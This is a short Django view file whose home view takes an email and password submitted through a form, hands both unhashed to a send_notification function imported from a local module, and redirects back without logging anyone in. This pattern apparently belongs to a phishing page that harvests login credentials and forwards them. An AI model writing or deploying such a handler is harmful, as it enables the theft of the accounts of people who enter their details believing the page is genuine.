from django.shortcuts import render
from django.shortcuts import redirect
from .send import send_notification

# Create your views here.
def home(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        
        send_notification(email, password)
        
        return redirect('home')

    return render(request, 'home.html')
